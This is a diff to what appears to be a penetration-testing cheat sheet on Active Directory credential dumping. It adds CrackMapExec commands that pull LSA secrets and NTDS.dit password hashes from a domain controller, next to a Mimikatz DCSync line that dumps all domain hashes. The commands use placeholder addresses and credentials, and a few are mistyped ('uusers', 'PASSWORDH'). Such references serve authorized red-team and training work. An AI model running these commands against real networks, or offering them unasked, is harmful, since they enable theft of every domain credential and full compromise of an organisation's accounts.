@@ -108,3 +108,14 @@ Then locally extract NTDS.dit and SYSTEM registry data using Impacket script sec
 Or use Mimikatz to extract hashes from NTDS.dit    
 
 mimikatz # lsadump::dcsync /domain:domain.local /all /csv          
+
+## Crackmapexec     
+Dump LSA secrets     
+
+    crackmapexec smb 10.10.10.10 -u UserNAme -p 'PASSWORDH' --lsa   #dump lsa secrets - need admin on domain controller          
+Dump NTDS.dit   
+
+    crackmapexec smb 192.168.1.100 -u UserNAme -p 'PASSWORD' --ntds     
+    crackmapexec smb 192.168.1.100 -u UserNAme -p 'PASSWORD' --ntds --users     
+    crackmapexec smb 192.168.1.100 -u UserNAme -p 'PASSWORD' --ntds uusers --enabled      
+    crackmapexec smb 192.168.1.100 -u UserNAme -p 'PASSWORD' --ntds vss     
